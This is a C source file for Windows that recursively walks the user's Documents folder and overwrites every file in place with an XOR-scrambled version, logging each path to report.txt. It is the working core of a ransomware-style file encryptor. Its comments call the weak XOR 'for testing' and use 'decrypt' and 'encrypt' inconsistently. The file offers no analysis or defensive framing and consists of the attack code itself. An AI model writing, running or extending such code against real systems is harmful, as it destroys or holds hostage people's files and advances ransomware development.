#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <shlobj.h>

FILE *logFile = NULL;  // File pointer for logging errors

// Function prototypes
void encryptDocuments(void);
void encryptFolder(const TCHAR* folderPath);
void encryptFile(const TCHAR* filePath);

// Function to log error messages to the report file
void logError(const TCHAR *errorMsg) {
    if (logFile) {
        _ftprintf(logFile, TEXT("%s\n"), errorMsg);
        fflush(logFile);  // Ensure the message is written immediately
    }
}

// Main function - Entry point for the executable
int main() {
    // Open the report file for appending error messages
    logFile = _tfopen(TEXT("report.txt"), TEXT("a"));
    if (logFile) {
        logError(TEXT("Executable Loaded - Starting process...\n"));
        encryptDocuments();  // Calls the function to decrypt the Documents folder
        logError(TEXT("Decryption completed.\n"));
        fclose(logFile); // Close the log file
    } else {
        // If the file can't be opened, print a generic error to the console
        MessageBox(NULL, TEXT("Failed to open the report file."), TEXT("Error"), MB_OK);
        return 1;  // Return error code
    }

    return 0;  // Successfully executed
}

// Function to decrypt the Documents folder
void encryptDocuments() {
    TCHAR szPath[MAX_PATH];
    
    // Get the path to the user's Documents folder
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_MYDOCUMENTS, NULL, 0, szPath))) {
        _tprintf(TEXT("Documents folder found at: %s\n"), szPath);  // Display the found path
        logError(TEXT("Found Documents folder: "));
        logError(szPath); // Log the folder path

        // Begin recursive decryption of the files and folders inside Documents
        encryptFolder(szPath);
    } else {
        logError(TEXT("Error retrieving Documents folder path.\n"));
    }
}

// Recursive function to encrypt the folder and its subdirectories
void encryptFolder(const TCHAR* folderPath) {
    TCHAR searchPath[MAX_PATH];
    
    // Add * to search for all files and folders inside the folder
    _tcscpy_s(searchPath, MAX_PATH, folderPath);
    _tcscat_s(searchPath, MAX_PATH, _T("\\*")); // Add wildcard for file and folder search

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        logError(TEXT("Error accessing folder.\n"));
        return;
    }

    do {
        // Skip "." and ".."
        if (_tcscmp(findFileData.cFileName, _T(".")) != 0 && _tcscmp(findFileData.cFileName, _T("..")) != 0) {
            TCHAR fullFilePath[MAX_PATH];
            _tcscpy_s(fullFilePath, MAX_PATH, folderPath);
            _tcscat_s(fullFilePath, MAX_PATH, _T("\\")); 
            _tcscat_s(fullFilePath, MAX_PATH, findFileData.cFileName);

            // Check if it's a file or a folder
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // If it's a folder, recursively call the encryption function
                _tprintf(TEXT("Found folder: %s\n"), fullFilePath);
                logError(TEXT("Found folder: "));
                logError(fullFilePath); // Log folder path

                // Recursively encrypt files in the subfolder
                encryptFolder(fullFilePath);
            } else {
                // If it's a file, encrypt it
                _tprintf(TEXT("Encrypting file: %s\n"), fullFilePath);
                logError(TEXT("Encrypting file: "));
                logError(fullFilePath); // Log file path

                // Encrypt the file
                encryptFile(fullFilePath);
            }
        }
    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
}

// Function to encrypt a file (simple encryption with XOR for testing)
void encryptFile(const TCHAR* filePath) {
    // Open the file for reading and writing
    HANDLE hFile = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Error opening file %s\n"), filePath);
        logError(errorMsg);
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Error retrieving file size for %s\n"), filePath);
        logError(errorMsg);
        CloseHandle(hFile);
        return;
    }

    // Allocate a buffer for the file content
    BYTE* buffer = (BYTE*)malloc(dwFileSize);
    DWORD dwBytesRead;
    if (!ReadFile(hFile, buffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Error reading file content %s\n"), filePath);
        logError(errorMsg);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    // Encrypt the content (using XOR as an example)
    for (DWORD i = 0; i < dwFileSize; i++) {
        buffer[i] ^= 0xAA; // XOR with 0xAA
    }

    // Write the encrypted content back to the file
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD dwBytesWritten;
    if (!WriteFile(hFile, buffer, dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize) {
        TCHAR errorMsg[MAX_PATH];
        _stprintf_s(errorMsg, MAX_PATH, TEXT("Error writing to file %s\n"), filePath);
        logError(errorMsg);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    // Free resources
    free(buffer);
    CloseHandle(hFile);
}
